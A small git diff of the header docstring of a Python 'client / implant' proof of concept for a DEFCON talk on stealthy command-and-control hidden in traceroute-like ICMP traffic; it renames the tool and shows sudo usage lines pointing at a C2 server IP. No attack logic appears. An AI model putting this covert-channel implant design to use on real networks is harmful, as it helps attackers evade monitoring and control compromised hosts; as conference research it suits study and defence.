@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ShadowTrace - Client / Implant (PoC for DEFCON)
+Shadow-C2 - Client / Implant (PoC for DEFCON)
 ================================================
 Paper: High-Bandwidth Stealth C2 via Traceroute Mimicry and ICMP Time Exceeded
 
@@ -14,8 +14,8 @@ Sequence (slide figure):
   ping a.b.c.d (TTL=n+m+1) x3 -> Echo Reply from a.b.c.d     [done]
 
 Usage:
-  sudo python3 shadowtrace_client.py <C2_SERVER_IP> [POLL_INTERVAL_SEC]
-  e.g.: sudo python3 shadowtrace_client.py 192.168.1.100 5
+  sudo python3 client.py <C2_SERVER_IP> [POLL_INTERVAL_SEC]
+  e.g.: sudo python3 client.py 192.168.1.100 5
 
 Requirements:
   pip install scapy
